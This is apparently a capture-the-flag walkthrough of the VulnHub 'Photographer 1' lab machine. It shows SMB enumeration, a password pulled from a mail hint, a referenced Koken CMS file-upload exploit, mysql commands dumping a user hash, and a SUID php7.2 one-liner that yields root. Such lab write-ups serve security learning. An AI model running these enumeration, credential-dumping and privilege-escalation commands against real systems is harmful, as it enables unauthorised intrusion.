---
title: "Photographer 1: Vulnhub Walkthrough"
date: 2024-08-23T20:04:35-08:00
draft: false
description: "Photographer contains multiple exploits and misconfigurations. Starting with retrieving credentials from Samba shares then exploiting Koken CMS to gain a reverse shell. LinPEAS revealed MySQL credentials and a SUID PHP binary, enabling privilege escalation to root."
noindex: false
featured: false
pinned: false
# comments: false
series:
  - walkthroughs
categories:
#  - 
tags:
#  - 
images: [photographer-1.png]
#  - 
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
---

## Introduction

| URL | [https://vulnhub.com/entry/photographer-1,519/](https://vulnhub.com/entry/photographer-1,519/) |
| --- | --- |
| Platform | VulnHub |
| Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |

## Walkthrough

Run `nmap -A` to discover ports `80,139,445,8000`:

```shell
└─$ nmap -A -sC -p- 192.168.5.124
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 19:18 UTC
Nmap scan report for 192.168.5.124
Host is up (0.31s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn?
445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: daisa ahomi
Service Info: Host: PHOTOGRAPHER

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2024-08-11T22:20:47-04:00
| smb2-time: 
|   date: 2024-08-12T02:20:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 8h19m58s, deviation: 2h18m33s, median: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.97 seconds
```

\
Run `enum4linux` to discover samba shares and local users:

```shell
... 
 ========================================== 
|    Share Enumeration on 192.168.5.124    |
 ========================================== 
[V] Attempting to get share list using authentication

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PHOTOGRAPHER
...
S-1-22-1-1000 Unix User\daisa (Local User)
S-1-22-1-1001 Unix User\agi (Local User)
...
```

\
Use `smbclient` to connect to the sambashare share as the `guest` user and download the share contents:

```shell
└─$ smbclient \\\\192.168.5.124\\sambashare --user=guest                                                                                1 ⨯
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jul 20 18:30:07 2020
  ..                                  D        0  Tue Jul 21 02:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 18:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 18:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
                
smb: \> get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (19.6 KiloBytes/sec) (average 19.6 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (10282.6 KiloBytes/sec) (average 10092.2 KiloBytes/sec)
smb: \> exit
```

\
View the `mailsent.txt` file.. there is a hint indicating a possible password `babygirl`:

```shell
└─$ cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

\
Run `dirbuster` to discover the `/admin` page:

```shell
└─$ dirb http://192.168.5.124:8000 /usr/share/wordlists/dirb/common.txt -f
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 11 19:47:32 2024
URL_BASE: http://192.168.5.124:8000/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.5.124:8000/ ----
...                                                                               
==> DIRECTORY: http://192.168.5.124:8000/admin/                                                                                            
+ http://192.168.5.124:8000/admin.cgi (CODE:302|SIZE:0)                                                                                    
+ http://192.168.5.124:8000/admin.php (CODE:302|SIZE:0)                                                                                    
+ http://192.168.5.124:8000/admin.pl (CODE:302|SIZE:0)                                                                                     
+ http://192.168.5.124:8000/akeeba.backend.log (CODE:302|SIZE:0)                                                                           
==> DIRECTORY: http://192.168.5.124:8000/app/                                                                                              
...
==> DIRECTORY: http://192.168.5.124:8000/storage/
```

\
Login to the koken `/admin` page using the following credentials: `daisa@photographer.com:babygirl`

\
Use `searchsploit` to find a koken exploit affecting the specific version of koken on the target:

```shell
─$ searchsploit koken       
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                                 | php/webapps/48706.txt
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                            
┌──(vagrant㉿kali)-[~/Downloads]
└─$ searchsploit -x 48706
  Exploit: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
      URL: https://www.exploit-db.com/exploits/48706
     Path: /usr/share/exploitdb/exploits/php/webapps/48706.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
```

\
Follow the instructions in the exploit to get a netcat reverse shell.

\
Run linpeas to find the local `mysql` database user password:

```shell
╔══════════╣ Searching passwords in config PHP files

/var/www/html/koken/app/application/config/database.php:$db['default']['password'] = $db_config['password'];                                

/var/www/html/koken/storage/configuration/database.php:         'password' => 'user_password_here',



View the database username/password in /var/www/html/koken/storage/configuration/database.php


<?php
	return array(
		'hostname' => 'localhost',
		'database' => 'koken',
		'username' => 'kokenuser',
		'password' => 'user_password_here',
		'prefix' => 'koken_',
		'socket' => ''
	);



Connect to local mysql server and list local databases:


mysql -u kokenuser -puser_password_here -h 127.0.0.1 -e "show databases;"
Database
information_schema
koken



Show all tables in the koken database:


$ mysql -u kokenuser -puser_password_here -h 127.0.0.1 -D koken -e "show tables;"
Tables_in_koken
koken_albums
koken_applications
koken_categories
koken_content
koken_drafts
koken_history
koken_join_albums_categories
koken_join_albums_content
koken_join_albums_covers
koken_join_albums_tags
koken_join_albums_text
koken_join_categories_content
koken_join_categories_text
koken_join_content_tags
koken_join_tags_text
koken_plugins
koken_settings
koken_slugs
koken_tags
koken_text
koken_trash
koken_urls
koken_users
```

\
View the `koken_users` table to see the password hash for the daisa user (which we already know is `babygirl`):

```shell
$ mysql -u kokenuser -puser_password_here -h 127.0.0.1 -D koken -e "select * from koken_users;"
id	password	email	created_on	modified_on	first_name	last_name	public_first_name	public_last_name	public_display	public_email	twitter	facebook	google	internal_id	remember_me
1	$2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK	daisa@photographer.com	1595292775	1723430563	daisa	ahomidaisa	ahomi	both	daisa@photographer.com	NULL	NULL	NULL	6d9505613547705d48ec6ac1792b18e0	4b0176d800bd42bfaf0c6969ea66be3d
```

\
Use the find command to discover that the `php7.2` binary is SUID root enabled:

```shell
$ find / -user root -perm -4000 -print 2>/dev/null | xargs ls -lh | egrep -v "/bin/mount|/bin/su|/bin/ping|/bin/umount|/usr/bin/chfn|/usr/bin/locate|/usr/bin/ssh-agent|/usr/bin/sudo|/usr/bin/passwd|/usr/bin/gpasswd|/usr/bin/newgrp|/usr/bin/lockfile|/usr/bin/at|/usr/bin/chage|/usr/bin/crontab|/usr/bin/sudoedit|/usr/bin/chsh|/usr/kerberos/bin/ksu|/usr/libexec/utempter/utempter|openssh/ssh-keysign|/usr/lib/squid/ncsa_auth|/usr/lib/squid/pam_auth|vmware-user-suid-wrapper|/usr/lib/news/bin/startinnfeed|/usr/lib/news/bin/inndstart|/usr/bin/wall|/usr/bin/write|/usr/sbin/usernetctl|/usr/sbin/suexec|/usr/sbin/lockdev|/usr/sbin/userhelper|/usr/sbin/ccreds_validate|dbus-daemon-launch-helper|pam_timestamp_check|/sbin/unix_chkpwd|/sbin/netreport|/sbin/mount|/sbin/umount|/bin/fusermount|bin/pppd|/usr/bin/X|/usr/bin/mlocate|/usr/lib/news/bin/rnews|/usr/sbin/userisdnctl|sendmail.sendmail|hal-mtab-lock|/usr/bin/rcp|/usr/bin/rsh|/usr/bin/rlogin|ccreds_chkpwd|pt_chown|plugin-config|proximity-helper"
...
  -rwsr-xr-x 1 root root       4.7M Jul  9  2020 /usr/bin/php7.2
```

\
Escalate privileges to root using the PHP SUID binary (see: [https://gtfobins.github.io/gtfobins/php/](https://gtfobins.github.io/gtfobins/php/)):

```shell
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
whoami
root
```
